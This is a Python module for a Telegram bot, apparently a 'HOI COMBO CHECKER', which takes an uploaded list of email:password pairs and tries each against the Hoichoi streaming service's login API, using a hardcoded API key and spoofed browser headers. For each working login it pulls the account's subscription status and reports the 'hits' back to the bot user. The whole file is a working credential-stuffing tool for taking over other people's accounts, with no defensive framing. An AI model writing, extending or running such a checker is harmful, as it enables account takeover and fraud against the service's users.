# hoitxt.py

import requests
import time
from telebot import types

# Global variables for storing results
hit_combos = []
dead_combos = []

def process_hoitxt_command(bot, message):
    global hit_combos, dead_combos
    chat_id = message.chat.id

    if not message.document:
        bot.send_message(chat_id, "Please upload a .txt file containing email:password combos.")
        return

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    combo_text = downloaded_file.decode("utf-8")
    combos = combo_text.splitlines()

    total_accounts = len(combos)
    start_time = time.time()
    hits = 0
    dead = 0
    hit_combos = []
    dead_combos = []

    inline_keyboard = types.InlineKeyboardMarkup()
    inline_keyboard.add(types.InlineKeyboardButton("HIT ✅", callback_data="hoitxt_hit"))
    inline_keyboard.add(types.InlineKeyboardButton("Dead ❌", callback_data="hoitxt_dead"))
    inline_keyboard.add(types.InlineKeyboardButton("Cancel ❌", callback_data="hoitxt_cancel"))

    initial_message = "↯ HOI COMBO CHECKER\n\nCombo checking:\n"
    msg = bot.send_message(chat_id, initial_message + "Waiting for first combo..." + "\n\n" + get_footer_info(total_accounts, hits, dead, start_time, message.from_user.username), reply_markup=inline_keyboard)

    for combo in combos:
        result = check_hoi_account(combo)
        if "HIT SUCCESSFULLY" in result:
            hits += 1
            hit_combos.append((combo, result))
        else:
            dead += 1
            dead_combos.append(combo)

        bot.edit_message_text(
            chat_id=chat_id,
            message_id=msg.message_id,
            text=initial_message + f"{combo}\n\n" + get_footer_info(total_accounts, hits, dead, start_time, message.from_user.username),
            reply_markup=inline_keyboard
        )
        time.sleep(1)  # Add delay to simulate processing time

def check_hoi_account(account):
    email, password = account.split(':')
    login_url = "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-364a8001-dbe1-2d16-ddde-33429eb8474c"
    headers = {
        "scheme": "https",
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "content-length": "54",
        "content-type": "application/json;charset=UTF-8",
        "origin": "https://www.hoichoi.tv",
        "referer": "https://www.hoichoi.tv/",
        "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
        "x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
    }
    data = {
        "email": email,
        "password": password
    }

    response = requests.post(login_url, headers=headers, json=data)
    response_data = response.json()

    if "error" in response_data:
        error_message = response_data["error"]
        if "Sorry, we can't find an account with this email address." in error_message:
            return "Email Not Registered❌"
        elif "Your email or password is incorrect, please try again." in error_message:
            return "EMAIL OR PASSWORD INCORRECT❌"
        else:
            return f"Unexpected error: {error_message}"
    elif "authorizationToken" in response_data:
        auth_token = response_data["authorizationToken"]
        return check_subscription(auth_token)
    else:
        return "Unexpected error occurred❌"

def check_subscription(auth_token):
    subscription_url = "https://prod-api.viewlift.com/payments/billing-history?site=hoichoitv"
    headers = {
        "scheme": "https",
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "authorization": auth_token,
        "referer": "https://www.hoichoi.tv/",
        "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "user-agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
        "x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
    }

    response = requests.get(subscription_url, headers=headers)
    response_data = response.json()

    if "subscriptionStatus" in response_data and "subscriptionEndDate" in response_data:
        subscription_status = response_data["subscriptionStatus"]
        subscription_end_date = response_data["subscriptionEndDate"].split("T")[0]
        return f"HIT SUCCESSFULLY✅\nSubscription Status: {subscription_status}\nSubscription End Date: {subscription_end_date}"
    else:
        return "HIT SUCCESSFULLY✅\nSubscription Status: Unknown\nSubscription End Date: Unknown"

def get_footer_info(total_accounts, hits, dead, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"• Total Combos - {total_accounts}\n"
        f"• Hits ✅ - {hits}\n"
        f"• Dead ❌ - {dead}\n"
        f"• Time Taken - {elapsed_time:.2f} seconds\n"
        f"• Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB 👑\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer

def handle_callback_query(bot, call):
    global hit_combos, dead_combos
    if call.data == "hoitxt_hit":
        if hit_combos:
            hit_message = "Hit Results:\n\n" + "\n\n".join([f"Combo: {combo}\n{details}" for combo, details in hit_combos])
        else:
            hit_message = "No hits found."
        bot.send_message(call.message.chat.id, hit_message)
    elif call.data == "hoitxt_dead":
        if dead_combos:
            dead_message = "Dead Results:\n\n" + "\n".join(dead_combos)
        else:
            dead_message = "No dead combos found."
        bot.send_message(call.message.chat.id, dead_message)
    elif call.data == "hoitxt_cancel":
        bot.send_message(call.message.chat.id, "Process stopped.")
